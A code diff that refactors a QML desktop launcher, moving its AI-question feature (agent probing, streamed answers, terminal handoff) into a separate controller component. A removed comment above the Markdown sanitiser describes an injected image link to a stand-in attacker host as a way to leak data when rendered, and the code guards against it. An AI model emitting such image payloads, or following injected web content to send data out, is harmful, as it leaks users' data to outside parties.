@@ -94,7 +94,7 @@ Item {
   // back to the flat list of answers.
   property var systemMatches: []
   property int systemMatchIndex: 0
-  readonly property bool systemTwoPane: root.tabsActive && root.activeTab === "system" && !root.isAiMode
+  readonly property bool systemTwoPane: root.tabsActive && root.activeTab === "system" && !aiCtl.isAiMode
     && (!root.filterText.trim() || root.systemMatches.length > 0)
   property string systemPane: "left"
   property int systemCategoryIndex: 0
@@ -158,62 +158,6 @@ Item {
   // save writes back what it did not change instead of dropping it.
   property var stateData: ({})
 
-  // AI answers, ported from omarchy-find (ai/*.js, MIT). A query that opens
-  // with the prefix ("ai ") is a question for the configured agent instead
-  // of a search: nothing leaves the machine until Enter, the answer streams
-  // into the card, and Enter again continues the conversation in a terminal.
-  // Config: ai.json next to state.json, falling back to the
-  // Omarchy default agent. See ai/AiAdapters.js for the tool restrictions
-  // every headless run is started with.
-  // Next to state.json rather than in the plugin directory: an edit there
-  // reloads every shell plugin, and removing the plugin would take it along.
-  readonly property string aiConfigPath: root.stateDir + "/ai.json"
-  readonly property string omarchyAgentPath: root.homeDir + "/.config/omarchy/defaults/agent"
-  property string aiPrefix: "ai "
-  readonly property var aiPromptOrNull: root.tabsActive ? AiBackend.matchPrefix(root.filterText, root.aiPrefix) : null
-  readonly property bool isAiMode: root.aiPromptOrNull !== null
-  readonly property string aiPromptText: root.isAiMode ? root.aiPromptOrNull : ""
-  property var aiSession: null
-  property bool aiConfigLoaded: false
-  property string aiConfigWarning: ""
-  property var aiConfigLastRawText: undefined
-  property var aiConfigLastOmarchyAgent: undefined
-  property var aiConfigPendingRaw: null
-  property int aiStreamFlushMs: 16
-  property int aiMaxAnswerRows: 6
-  property bool aiBinaryChecked: false
-  property bool aiBinaryMissing: false
-  property string aiBinaryCheckedFor: ""
-  property var aiPendingSpawn: null
-  property int aiHandoffAttempt: 0
-  property string aiHandoffError: ""
-  // Which agents can be asked: the enabled adapters whose CLI is on PATH,
-  // probed each time AI mode opens. In AI mode the tab bar lists these
-  // instead of the tabs, Tab / Shift+Tab (or Ctrl+1..n) switches between
-  // them, and the last pick is remembered in state.json ("aiAgent") -- the
-  // configured agent is not always the one with usage left.
-  property var aiAgents: []
-  property string aiAgent: ""
-  readonly property var aiAgentTabs: {
-    var out = []
-    var all = AiBackend.selectableAgents()
-    for (var i = 0; i < all.length; i++)
-      if (root.aiAgents.indexOf(all[i].id) >= 0) out.push({ id: all[i].id, label: all[i].label, icon: "󰚩" })
-    return out
-  }
-  readonly property int aiLineHeight: Math.round(root.scaledFont(Style.font.body) * 1.45)
-
-  onIsAiModeChanged: {
-    if (root.isAiMode) root.probeAiAgents()
-    if (root.isAiMode) {
-      root.aiSession = AiBackend.snapshot()
-      root.ensureAiBinaryChecked()
-    } else {
-      root.aiCancel()
-      root.aiSession = null
-      root.aiHandoffError = ""
-    }
-  }
   property string filterText: ""
   property int selectedIndex: 0
   property bool cursorActive: false
@@ -237,8 +181,8 @@ Item {
     deleteTarget = null
     utilityAnswers = ({})
     root.cancelFileSearch()
-    root.aiCancel()
-    root.aiSession = AiBackend.snapshot()
+    aiCtl.aiCancel()
+    aiCtl.aiSession = AiBackend.snapshot()
     root.fileResults = []
     root.fileResultsKey = ""
     root.fileResultsScope = ""
@@ -420,7 +364,7 @@ Item {
   property int visibleRowsHeight: root.dmenuActive
     ? dmenuRowListHeight(layoutSerial, displayModel.count, filterText)
     : (root.compact ? 0
-      : (root.launcherFixedHeight || root.gridActive || root.isAiMode || root.systemTwoPane
+      : (root.launcherFixedHeight || root.gridActive || aiCtl.isAiMode || root.systemTwoPane
         ? root.launcherBodyHeight
         : Math.min(root.launcherBodyHeight, Math.max(root.baseRowHeight * 3,
             rowListHeight(layoutSerial, displayModel.count, filterText, searchDivider)))))
@@ -645,7 +589,7 @@ Item {
     root.loadMenuSources()
     root.loadStyle()
     root.loadState()
-    root.loadAiConfig()
+    aiCtl.loadAiConfig()
   }
 
   function item(id) {
@@ -967,280 +911,6 @@ Item {
     }
   }
 
-  // --------------------------------------------------------------------- AI
-  //
-  // Everything here only forwards process I/O into AiBackend and renders the
-  // snapshot it hands back; the state machine, the per-agent argv and the
-  // streaming pace all live in ai/*.js. Ported from omarchy-find's Find.qml,
-  // whose comments explain the process-slot and handoff invariants kept here.
-
-  // Both config sources are re-read on every open, through the same guarded
-  // reader as the menu JSONC, rather than watched.
-  function loadAiConfig() {
-    if (aiConfigProc.running || aiAgentProc.running) return
-    aiConfigProc.command = root.readFileCommand(root.aiConfigPath, 65536)
-    aiConfigProc.running = true
-  }
-
-  function applyAiConfig(rawText, omarchyAgent) {
-    var agent = String(omarchyAgent || "").trim()
-    if (root.aiConfigLoaded && rawText === root.aiConfigLastRawText && agent === root.aiConfigLastOmarchyAgent) return
-    root.aiConfigLastRawText = rawText
-    root.aiConfigLastOmarchyAgent = agent
-    var result = AiBackend.loadConfig(rawText, agent)
-    if (root.aiAgent) AiBackend.setAgent(root.aiAgent)
-    root.aiConfigLoaded = true
-    root.aiConfigWarning = result.warning || ""
-    var cfg = AiBackend.getConfig()
-    root.aiPrefix = cfg.prefix
-    root.aiStreamFlushMs = cfg.streamFlushMs
-    root.aiMaxAnswerRows = cfg.maxAnswerRows
-    if (root.isAiMode) {
-      root.aiSession = AiBackend.snapshot()
-      root.ensureAiBinaryChecked()
-    }
-  }
-
-  function probeAiAgents() {
-    if (aiAgentProbe.running) return
-    var all = AiBackend.selectableAgents()
-    var binaries = []
-    for (var i = 0; i < all.length; i++) binaries.push(all[i].binary)
-    aiAgentProbe.command = ["sh", "-c",
-      'for b; do command -v -- "$b" >/dev/null 2>&1 && printf "%s\\n" "$b"; done', "sh"].concat(binaries)
-    aiAgentProbe.running = true
-  }
-
-  function applyAiAgentProbe(text) {
-    var found = String(text || "").split("\n")
-    var all = AiBackend.selectableAgents()
-    var agents = []
-    for (var i = 0; i < all.length; i++) if (found.indexOf(all[i].binary) >= 0) agents.push(all[i].id)
-    root.aiAgents = agents
-    if (agents.length === 0) return
-
-    // Remembered pick, else the configured agent, else the first installed.
-    var wanted = [String(root.stateData.aiAgent || ""), root.aiAgent, AiBackend.getConfig().agent]
-    var pick = agents[0]
-    for (var w = 0; w < wanted.length; w++) if (agents.indexOf(wanted[w]) >= 0) { pick = wanted[w]; break }
-    root.setAiAgent(pick, false)
-  }
-
-  // Switching agent drops whatever the previous one was doing: the next
-  // Enter asks the new agent from scratch.
-  function setAiAgent(id, remember) {
-    if (root.aiAgents.indexOf(id) < 0) return
-    var changed = id !== root.aiAgent || AiBackend.getConfig().agent !== id
-    if (!AiBackend.setAgent(id)) return
-    root.aiAgent = id
-    if (changed) {
-      root.aiCancel()
-      root.aiHandoffError = ""
-      root.aiBinaryChecked = false
-      if (root.isAiMode) {
-        root.aiSession = AiBackend.snapshot()
-        root.ensureAiBinaryChecked()
-      }
-    }
-    if (remember !== false && root.stateData.aiAgent !== id) root.saveState()
-  }
-
-  function cycleAiAgent(delta) {
-    var list = root.aiAgents
-    if (list.length === 0) return
-    var index = list.indexOf(root.aiAgent)
-    if (index < 0) index = 0
-    root.setAiAgent(list[((index + delta) % list.length + list.length) % list.length])
-  }
-
-  function ensureAiBinaryChecked() {
-    var disp = AiBackend.agentDisplay()
-    if (!disp.supported) {
-      root.aiBinaryChecked = true
-      root.aiBinaryMissing = true
-      return
-    }
-    root.aiBinaryCheckedFor = disp.binary
-    if (root.aiBinaryChecked && aiBinaryCheck.checkingFor === disp.binary) return
-    if (aiBinaryCheck.running) return
-    root.aiBinaryChecked = false
-    aiBinaryCheck.checkingFor = disp.binary
-    aiBinaryCheck.command = ["sh", "-c", 'command -v -- "$1" >/dev/null', "sh", disp.binary]
-    aiBinaryCheck.running = true
-  }
-
-  function aiKillProcessIfRunning(proc, fallbackTimer) {
-    if (!proc.running) return
-    var pid = proc.processId
-    proc.running = false
-    if (pid) {
-      Quickshell.execDetached(AiBackend.killArgv(pid, "TERM"))
-      fallbackTimer.targetPid = pid
-      fallbackTimer.restart()
-    }
-  }
-
-  // Never touches a Process whose `running` is still true; see omarchy-find
-  // (and AiBackend.pickFreeSlot) for why a stopping slot is not yet free.
-  function aiFreeProc() {
-    var slot = AiBackend.pickFreeSlot(aiProcA.running, aiProcB.running)
-    return slot === "A" ? aiProcA : (slot === "B" ? aiProcB : null)
-  }
-
-  function aiDispatchOrQueue(generation, argv) {
-    var proc = root.aiFreeProc()
-    if (!proc) {
-      root.aiPendingSpawn = { generation: generation, argv: argv }
-      return
-    }
-    root.aiPendingSpawn = null
-    proc.gen = generation
-    // Spawned with stdin enabled and closed in onStarted: otherwise the child
-    // inherits a stdin that never reaches EOF, and codex exec waits on it.
-    proc.stdinEnabled = true
-    proc.command = argv
-    proc.running = true
-  }
-
-  function aiTryDispatchPending() {
-    if (!root.aiPendingSpawn) return
-    var proc = root.aiFreeProc()
-    if (!proc) return
-    var pending = root.aiPendingSpawn
-    root.aiPendingSpawn = null
-    proc.gen = pending.generation
-    proc.stdinEnabled = true
-    proc.command = pending.argv
-    proc.running = true
-  }
-
-  function aiCancel(invalidateHandoff) {
-    root.aiPendingSpawn = null
-    root.aiKillProcessIfRunning(aiProcA, aiKillFallbackTimerA)
-    root.aiKillProcessIfRunning(aiProcB, aiKillFallbackTimerB)
-    if (invalidateHandoff !== false) root.aiHandoffAttempt++
-    aiHandoffGrace.stop()
-    AiBackend.cancel()
-  }
-
-  function aiSubmit() {
-    if (!root.isAiMode || root.aiBinaryMissing) return
-    var prompt = root.aiPromptText.trim()
-    if (prompt.length === 0) return
-    root.aiCancel()
-    var result = AiBackend.beginGeneration(prompt)
-    root.aiSession = AiBackend.snapshot()
-    root.aiHandoffError = ""
-    if (!result.argv) return
-    root.aiDispatchOrQueue(result.generation, result.argv)
-  }
-
-  function onAiLine(gen, line) {
-    var snap = AiBackend.handleLine(gen, line)
-    if (snap) root.aiSession = snap
-  }
-
-  function onAiStderr(gen, line) {
-    AiBackend.handleStderrChunk(gen, line + "\n")
-  }
-
-  function onAiExit(gen, exitCode) {
-    var snap = AiBackend.handleExit(gen, exitCode)
-    if (snap) root.aiSession = snap
-  }
-
-  function aiCopyAnswer() {
-    if (!root.aiSession || root.aiSession.state === "idle" || !root.aiSession.rawText) return
-    Quickshell.execDetached(["wl-copy", "--", root.aiSession.rawText])
-  }
-
-  function aiPromptChangedSinceSubmit() {
-    var s = root.aiSession
-    return !!(s && typeof s.prompt === "string" && s.prompt.length > 0 && root.aiPromptText.trim() !== s.prompt)
-  }
-
-  function aiCanReask() {
-    return root.aiPromptChangedSinceSubmit() && root.aiPromptText.trim().length > 0
-  }
-
-  function aiHandoff() {
-    if (!root.aiSession || root.aiSession.state !== "ready" || !root.aiSession.canHandoff) return
-    if (root.aiCanReask()) { root.aiSubmit(); return }
-    var resumeArgv = AiBackend.buildHandoffArgv()
-    if (!resumeArgv) return
-    var snap = AiBackend.beginHandoff()
-    if (!snap) return
-    root.aiSession = snap
-    root.aiHandoffError = ""
-    root.aiHandoffAttempt++
-    aiHandoffProcess.attempt = root.aiHandoffAttempt
-    aiHandoffProcess.resumeArgv = resumeArgv
-    aiHandoffProcess.handled = false
-    // The equals form: xdg-terminal-exec reads "--dir DIR" as a command.
-    aiHandoffProcess.command = ["xdg-terminal-exec", "--dir=" + root.homeDir, "--"].concat(resumeArgv)
-    aiHandoffProcess.running = true
-    aiHandoffGrace.restart()
-  }
-
-  // Close the launcher on behalf of the AI flow. preserveHandoffAttempt is
-  // true only when a handoff itself concludes (see omarchy-find's dismiss).
-  function aiDismiss(preserveHandoffAttempt) {
-    root.aiCancel(!preserveHandoffAttempt)
-    root.aiSession = AiBackend.snapshot()
-    root.closeLauncher()
-  }
-
-  function aiChipText() {
-    var s = root.aiSession
-    if (!s) return "AI"
-    var parts = ["AI", s.agentLabel]
-    if (s.modelLabel) parts.push(s.modelLabel)
-    if (s.effortLabel) parts.push(s.effortLabel + " effort")
-    var text = parts.join(" · ")
-    if (root.aiBinaryMissing && s.supported !== false) text += " · not installed"
-    else if (s.state === "starting") text += " · starting…"
-    else if (s.state === "running") text += (s.activity === "searching" ? " · searching…" : " · thinking…")
-    else if (s.state === "draining") text += " · finishing…"
-    else if (s.state === "handoff") text += " · opening terminal…"
-    else if (s.state === "error") text += " · error"
-    return text
-  }
-
-  function aiFooterText() {
-    var s = root.aiSession
-    var state = s ? s.state : "idle"
-    var hint
-    if (state === "ready") {
-      if (root.aiCanReask()) hint = "Enter ask new question · Esc close"
-      else hint = (s && s.canHandoff) ? "↵ continue in terminal · Ctrl+C copy · Esc close" : "Ctrl+C copy · Esc close"
-    } else if (state === "handoff") {
-      hint = "Opening terminal…"
-    } else if (state === "error") {
-      hint = "Enter retry · Esc close"
-    } else if (state === "starting" || state === "running" || state === "draining") {
-      hint = "Esc cancel"
-    } else if (root.aiBinaryMissing) {
-      hint = "Agent CLI not found on PATH · Esc close"
-    } else {
-      hint = root.aiAgents.length > 1 ? "Enter ask · Tab switch agent · Esc close" : "Enter ask · Esc close"
-    }
-    if (root.aiHandoffError) hint += "\n" + root.aiHandoffError
-    return hint
-  }
-
-  // The answer is rendered as Markdown, and answers are shaped by whatever
-  // the agent read on the web. Rich text fetches images on its own, so an
-  // injected `![](https://attacker/?q=...)` would be a request made the
-  // moment it is drawn. Images are demoted to plain links and raw HTML is
-  // escaped before rendering; links open only when clicked, and only http(s).
-  function aiRenderable(text) {
-    return String(text || "").replace(/!\[/g, "[").replace(/</g, "\\<")
-  }
-
-  function aiOpenLink(link) {
-    if (/^https?:\/\//i.test(String(link || ""))) root.openUrl(String(link))
-  }
-
   // ------------------------------------------------------------ file search
 
   function fileFilterFor(kind) {
@@ -1250,7 +920,7 @@ Item {
   // What the current tab and query ask of fd, or null for nothing: which
   // types to list and with which filter.
   function fileSearchSpec() {
-    if (root.dmenuActive || !root.opened || root.isAiMode) return null
+    if (root.dmenuActive || !root.opened || aiCtl.isAiMode) return null
     var query = root.filterText.trim()
     if (root.activeTab === "files")
       return { scope: "files|" + root.fileFilterIndex, key: "files|" + root.fileFilterIndex + "|" + query, query: query, dirs: false, files: true, filter: root.fileFilterFor("files") }
@@ -1627,7 +1297,7 @@ Item {
     next.tabOrder = root.tabOrder
     next.allSections = root.allSectionOrder
     next.disabledTabs = root.disabledTabs
-    if (root.aiAgent) next.aiAgent = root.aiAgent
+    if (aiCtl.aiAgent) next.aiAgent = aiCtl.aiAgent
     root.stateData = next
     stateWriteProc.command = root.stateFileWriteCommand(root.statePath, JSON.stringify(next, null, 2) + "\n", false)
     stateWriteProc.running = true
@@ -2629,7 +2299,7 @@ Item {
     var rows = []
     // A question for the agent is not also a search: the AI panel takes the
     // card's body, and nothing is looked up until Enter.
-    if (root.isAiMode) rows = []
+    if (aiCtl.isAiMode) rows = []
     // Two panes show the active menu's own entries, never filtered: a search
     // moves the selection instead. A category that is an action (About) has
     // no entries to show, and "root" would otherwise list the categories
@@ -2713,7 +2383,7 @@ Item {
   // Menu entries matching the query, best first (ids).
   function updateSystemMatches() {
     var query = root.filterText.trim()
-    if (!query || !root.tabsActive || root.activeTab !== "system" || root.isAiMode) {
+    if (!query || !root.tabsActive || root.activeTab !== "system" || aiCtl.isAiMode) {
       root.systemMatches = []
       root.systemMatchIndex = 0
       return
@@ -3008,151 +2678,9 @@ Item {
     }
   }
 
-  // ai.json, then the Omarchy default agent; applied once both are in. A
-  // missing file reads as empty, which AiConfig treats as "use defaults".
-  Process {
-    id: aiConfigProc
-    stdout: StdioCollector { id: aiConfigOut; waitForEnd: true }
-    onExited: function(exitCode) {
-      root.aiConfigPendingRaw = exitCode === 0 ? String(aiConfigOut.text || "") : null
-      aiAgentProc.command = root.readFileCommand(root.omarchyAgentPath, 4096)
-      aiAgentProc.running = true
-    }
-  }
-
-  Process {
-    id: aiAgentProc
-    stdout: StdioCollector { id: aiAgentOut; waitForEnd: true }
-    onExited: function(exitCode) {
-      root.applyAiConfig(root.aiConfigPendingRaw, exitCode === 0 ? String(aiAgentOut.text || "") : "")
-    }
-  }
-
-  Process {
-    id: aiAgentProbe
-    stdout: StdioCollector { id: aiAgentProbeOut; waitForEnd: true }
-    onExited: root.applyAiAgentProbe(aiAgentProbeOut.text)
-  }
-
-  Process {
-    id: aiBinaryCheck
-    property string checkingFor: ""
-    onExited: function(exitCode) {
-      if (aiBinaryCheck.checkingFor === root.aiBinaryCheckedFor) {
-        root.aiBinaryMissing = exitCode !== 0
-        root.aiBinaryChecked = true
-      } else {
-        Qt.callLater(root.ensureAiBinaryChecked)
-      }
-    }
-  }
-
-  // Two slots alternate per generation; only aiDispatchOrQueue and
-  // aiTryDispatchPending may set command/running on them.
-  Process {
-    id: aiProcA
-    property int gen: 0
-    onStarted: aiProcA.stdinEnabled = false
-    stdout: SplitParser { onRead: function(line) { root.onAiLine(aiProcA.gen, line) } }
-    stderr: SplitParser { onRead: function(line) { root.onAiStderr(aiProcA.gen, line) } }
-    onExited: function(exitCode) {
-      aiKillFallbackTimerA.stop()
-      aiKillFallbackTimerA.targetPid = null
-      root.onAiExit(aiProcA.gen, exitCode)
-      Qt.callLater(root.aiTryDispatchPending)
-    }
-  }
-
-  Process {
-    id: aiProcB
-    property int gen: 0
-    onStarted: aiProcB.stdinEnabled = false
-    stdout: SplitParser { onRead: function(line) { root.onAiLine(aiProcB.gen, line) } }
-    stderr: SplitParser { onRead: function(line) { root.onAiStderr(aiProcB.gen, line) } }
-    onExited: function(exitCode) {
-      aiKillFallbackTimerB.stop()
-      aiKillFallbackTimerB.targetPid = null
-      root.onAiExit(aiProcB.gen, exitCode)
-      Qt.callLater(root.aiTryDispatchPending)
-    }
-  }
-
-  // The agent runs in its own process group (setsid, AiBackend.wrapForGroup);
-  // anything in it still alive half a second after SIGTERM gets SIGKILL.
-  Timer {
-    id: aiKillFallbackTimerA
-    property var targetPid: null
-    interval: 500
-    onTriggered: {
-      if (aiKillFallbackTimerA.targetPid) {
-        Quickshell.execDetached(AiBackend.killArgv(aiKillFallbackTimerA.targetPid, "KILL"))
-        aiKillFallbackTimerA.targetPid = null
-      }
-    }
-  }
-
-  Timer {
-    id: aiKillFallbackTimerB
-    property var targetPid: null
-    interval: 500
-    onTriggered: {
-      if (aiKillFallbackTimerB.targetPid) {
-        Quickshell.execDetached(AiBackend.killArgv(aiKillFallbackTimerB.targetPid, "KILL"))
-        aiKillFallbackTimerB.targetPid = null
-      }
-    }
-  }
-
-  // The paced "typewriter" reveal; runs only while an answer is streaming.
-  Timer {
-    id: aiDrainTimer
-    interval: Math.max(8, root.aiStreamFlushMs)
-    repeat: true
-    running: !!(root.aiSession && (root.aiSession.state === "running" || root.aiSession.state === "draining"))
-    onTriggered: {
-      var snap = AiBackend.tick()
-      if (snap) root.aiSession = snap
-    }
-  }
-
-  Process {
-    id: aiHandoffProcess
-    property bool handled: true
-    property int attempt: 0
-    property var resumeArgv: null
-    stderr: StdioCollector { id: aiHandoffStderr; waitForEnd: false }
-    onExited: function(exitCode) {
-      var alreadyHandled = aiHandoffProcess.handled
-      aiHandoffProcess.handled = true
-      aiHandoffGrace.stop()
-      var superseded = aiHandoffProcess.attempt !== root.aiHandoffAttempt
-      if (exitCode === 0) {
-        if (!alreadyHandled && !superseded) root.aiDismiss()
-        return
-      }
-      console.warn("[omarchy-menu-omni/ai] terminal handoff failed (exit " + exitCode + "): " + (aiHandoffStderr.text || "(no stderr)"))
-      if (superseded) return
-      if (!alreadyHandled) {
-        root.aiHandoffError = "Could not open a terminal — try again or check your default terminal setup"
-        var snap = AiBackend.cancelHandoff()
-        if (snap) root.aiSession = snap
-      } else if (aiHandoffProcess.resumeArgv) {
-        Quickshell.execDetached(["notify-send", "Menu AI",
-          "Terminal failed to open — resume manually: " + aiHandoffProcess.resumeArgv.join(" ")])
-      }
-    }
-  }
-
-  // Still running after the grace window: the terminal launched.
-  Timer {
-    id: aiHandoffGrace
-    interval: 400
-    onTriggered: {
-      if (aiHandoffProcess.handled) return
-      aiHandoffProcess.handled = true
-      if (aiHandoffProcess.attempt !== root.aiHandoffAttempt) return
-      root.aiDismiss(true)
-    }
+  AiController {
+    id: aiCtl
+    menu: root
   }
 
   Timer {
@@ -3212,7 +2740,7 @@ Item {
     // If it's a link (a redirect to another menu), follow the link.
     if (entry && entry.kind === "link" && entry.target) id = entry.target
     var place = Tabs.tabForRoute(id)
-    root.loadAiConfig()
+    aiCtl.loadAiConfig()
     root.loadStyle()
     root.loadState()
     if (place.tab === "all" && !root.tabEnabled("all"))
@@ -3638,13 +3166,13 @@ Item {
             return
           }
 
-          if (root.isAiMode && (event.key === Qt.Key_Tab || event.key === Qt.Key_Backtab)) {
+          if (aiCtl.isAiMode && (event.key === Qt.Key_Tab || event.key === Qt.Key_Backtab)) {
             // In AI mode the bar holds agents, not tabs.
-            root.cycleAiAgent(event.key === Qt.Key_Backtab || (event.modifiers & Qt.ShiftModifier) ? -1 : 1)
+            aiCtl.cycleAiAgent(event.key === Qt.Key_Backtab || (event.modifiers & Qt.ShiftModifier) ? -1 : 1)
             event.accepted = true
-          } else if (root.isAiMode && (event.modifiers & Qt.ControlModifier)
-                     && event.key >= Qt.Key_1 && event.key < Qt.Key_1 + root.aiAgents.length) {
-            root.setAiAgent(root.aiAgents[event.key - Qt.Key_1])
+          } else if (aiCtl.isAiMode && (event.modifiers & Qt.ControlModifier)
+                     && event.key >= Qt.Key_1 && event.key < Qt.Key_1 + aiCtl.aiAgents.length) {
+            aiCtl.setAiAgent(aiCtl.aiAgents[event.key - Qt.Key_1])
             event.accepted = true
           } else if (root.tabsActive && (event.key === Qt.Key_Tab || event.key === Qt.Key_Backtab)) {
             // Claimed before anything else: left alone, Tab moves QML focus
@@ -3674,20 +3202,20 @@ Item {
                      && (event.key === Qt.Key_Left || (event.key === Qt.Key_Backspace && !root.filterText))) {
             root.systemBack()
             event.accepted = true
-          } else if (root.isAiMode && (event.key === Qt.Key_Return || event.key === Qt.Key_Enter)) {
+          } else if (aiCtl.isAiMode && (event.key === Qt.Key_Return || event.key === Qt.Key_Enter)) {
             if (!event.isAutoRepeat) {
-              var aiState = root.aiSession ? root.aiSession.state : "idle"
-              if (aiState === "idle" || aiState === "error") root.aiSubmit()
-              else if (aiState === "ready") root.aiHandoff()
+              var aiState = aiCtl.aiSession ? aiCtl.aiSession.state : "idle"
+              if (aiState === "idle" || aiState === "error") aiCtl.aiSubmit()
+              else if (aiState === "ready") aiCtl.aiHandoff()
             }
             event.accepted = true
-          } else if (root.isAiMode && event.key === Qt.Key_C && event.modifiers === Qt.ControlModifier) {
-            root.aiCopyAnswer()
+          } else if (aiCtl.isAiMode && event.key === Qt.Key_C && event.modifiers === Qt.ControlModifier) {
+            aiCtl.aiCopyAnswer()
             event.accepted = true
-          } else if (root.isAiMode && (event.key === Qt.Key_Up || event.key === Qt.Key_Down
+          } else if (aiCtl.isAiMode && (event.key === Qt.Key_Up || event.key === Qt.Key_Down
                      || event.key === Qt.Key_PageUp || event.key === Qt.Key_PageDown)) {
             var step = (event.key === Qt.Key_PageUp || event.key === Qt.Key_PageDown)
-              ? aiAnswerFlick.height : root.aiLineHeight * 2
+              ? aiAnswerFlick.height : aiCtl.aiLineHeight * 2
             var maxY = Math.max(0, aiAnswerFlick.contentHeight - aiAnswerFlick.height)
             var down = event.key === Qt.Key_Down || event.key === Qt.Key_PageDown
             aiAnswerFlick.contentY = down ? Math.min(maxY, aiAnswerFlick.contentY + step)
@@ -3876,14 +3404,14 @@ Item {
           id: tabBar
           visible: root.tabsActive
           height: visible ? implicitHeight : 0
-          tabs: root.isAiMode ? root.aiAgentTabs : root.orderedTabs
-          activeTab: root.isAiMode ? root.aiAgent : root.activeTab
+          tabs: aiCtl.isAiMode ? aiCtl.aiAgentTabs : root.orderedTabs
+          activeTab: aiCtl.isAiMode ? aiCtl.aiAgent : root.activeTab
           fontFamily: root.fontFamily
           foreground: root.foreground
           accent: Color.accent
           fontSize: root.scaledFont(Style.font.body)
           onTabClicked: function(id) {
-            if (root.isAiMode) root.setAiAgent(id)
+            if (aiCtl.isAiMode) aiCtl.setAiAgent(id)
             else root.setTab(id)
             Qt.callLater(function() { keyCatcher.forceActiveFocus() })
           }
@@ -3891,7 +3419,7 @@ Item {
 
         Item {
           id: fileBar
-          visible: root.tabsActive && !root.isAiMode && (root.activeTab === "files" || root.activeTab === "folders")
+          visible: root.tabsActive && !aiCtl.isAiMode && (root.activeTab === "files" || root.activeTab === "folders")
           width: parent.width
           height: visible ? fileFilterChips.implicitHeight : 0
 
@@ -3934,34 +3462,34 @@ Item {
           Item {
             id: aiPanel
             anchors.fill: parent
-            visible: root.isAiMode
+            visible: aiCtl.isAiMode
 
             Rectangle {
               id: aiChip
               height: aiChipLabel.implicitHeight + Style.space(10)
               width: aiChipLabel.implicitWidth + Style.space(18)
               radius: height / 2
-              color: root.aiSession && root.aiSession.state === "error" ? Util.alpha(Color.urgent, 0.18) : Util.alpha(Color.accent, 0.22)
+              color: aiCtl.aiSession && aiCtl.aiSession.state === "error" ? Util.alpha(Color.urgent, 0.18) : Util.alpha(Color.accent, 0.22)
 
               Text {
                 id: aiChipLabel
                 anchors.centerIn: parent
                 textFormat: Text.PlainText
-                text: root.aiChipText()
-                color: root.aiSession && root.aiSession.state === "error" ? Color.urgent : Color.accent
+                text: aiCtl.aiChipText()
+                color: aiCtl.aiSession && aiCtl.aiSession.state === "error" ? Color.urgent : Color.accent
                 font.family: root.fontFamily
                 font.pixelSize: root.scaledFont(Style.font.body)
               }
             }
 
             Text {
-              visible: root.aiConfigWarning !== ""
+              visible: aiCtl.aiConfigWarning !== ""
               anchors.left: aiChip.right
               anchors.leftMargin: Style.space(8)
               anchors.right: parent.right
               anchors.verticalCenter: aiChip.verticalCenter
               textFormat: Text.PlainText
-              text: root.aiConfigWarning
+              text: aiCtl.aiConfigWarning
               color: root.foreground
               opacity: 0.55
               elide: Text.ElideRight
@@ -3979,7 +3507,7 @@ Item {
               anchors.bottomMargin: root.contentSpacing
               radius: root.cornerRadius
               color: Util.alpha(root.foreground, 0.05)
-              visible: !!root.aiSession && root.aiSession.state !== "idle"
+              visible: !!aiCtl.aiSession && aiCtl.aiSession.state !== "idle"
 
               Flickable {
                 id: aiAnswerFlick
@@ -4003,19 +3531,19 @@ Item {
                   id: aiAnswerText
                   width: aiAnswerFlick.width
                   text: {
-                    var s = root.aiSession
+                    var s = aiCtl.aiSession
                     if (!s) return ""
-                    if (s.state !== "error") return root.aiRenderable(s.displayedText)
-                    var msg = root.aiRenderable(s.errorMessage || "")
+                    if (s.state !== "error") return aiCtl.aiRenderable(s.displayedText)
+                    var msg = aiCtl.aiRenderable(s.errorMessage || "")
                     return s.displayedText && s.displayedText.length > 0
-                      ? root.aiRenderable(s.displayedText) + "\n\n⚠ " + msg
+                      ? aiCtl.aiRenderable(s.displayedText) + "\n\n⚠ " + msg
                       : msg
                   }
                   textFormat: Text.MarkdownText
-                  onLinkActivated: function(link) { root.aiOpenLink(link) }
+                  onLinkActivated: function(link) { aiCtl.aiOpenLink(link) }
                   wrapMode: Text.Wrap
-                  color: (root.aiSession && root.aiSession.state === "error"
-                          && (!root.aiSession.displayedText || root.aiSession.displayedText.length === 0))
+                  color: (aiCtl.aiSession && aiCtl.aiSession.state === "error"
+                          && (!aiCtl.aiSession.displayedText || aiCtl.aiSession.displayedText.length === 0))
                     ? Color.urgent : root.foreground
                   font.family: root.fontFamily
                   font.pixelSize: root.scaledFont(Style.font.body)
@@ -4029,7 +3557,7 @@ Item {
               anchors.right: parent.right
               anchors.bottom: parent.bottom
               textFormat: Text.PlainText
-              text: root.aiFooterText()
+              text: aiCtl.aiFooterText()
               color: root.foreground
               opacity: 0.5
               wrapMode: Text.Wrap
@@ -4048,7 +3576,7 @@ Item {
             anchors.bottom: parent.bottom
             anchors.horizontalCenter: parent.horizontalCenter
             width: Math.max(cellWidth, Math.floor(parent.width / cellWidth) * cellWidth)
-            visible: root.gridActive && !root.isAiMode
+            visible: root.gridActive && !aiCtl.isAiMode
             model: root.gridActive ? displayModel : null
           }
 
@@ -4191,7 +3719,7 @@ Item {
             anchors.left: systemPaneDivider.right
             anchors.leftMargin: root.systemTwoPane ? Style.space(8) : 0
             anchors.right: parent.right
-            visible: !root.gridActive && !root.isAiMode
+            visible: !root.gridActive && !aiCtl.isAiMode
             model: displayModel
             clip: true
             spacing: root.rowSpacing
@@ -4446,7 +3974,7 @@ Item {
           Column {
             anchors.centerIn: parent
             spacing: Style.space(8)
-            visible: displayModel.count === 0 && root.mode !== "input" && !root.isAiMode && !root.systemTwoPane
+            visible: displayModel.count === 0 && root.mode !== "input" && !aiCtl.isAiMode && !root.systemTwoPane
 
             Text {
               textFormat: Text.PlainText
@@ -4475,7 +4003,7 @@ Item {
 
         Text {
           id: footer
-          visible: root.tabsActive && !root.compact && !root.isAiMode
+          visible: root.tabsActive && !root.compact && !aiCtl.isAiMode
           width: parent.width
           textFormat: Text.PlainText
           text: root.footerHints()
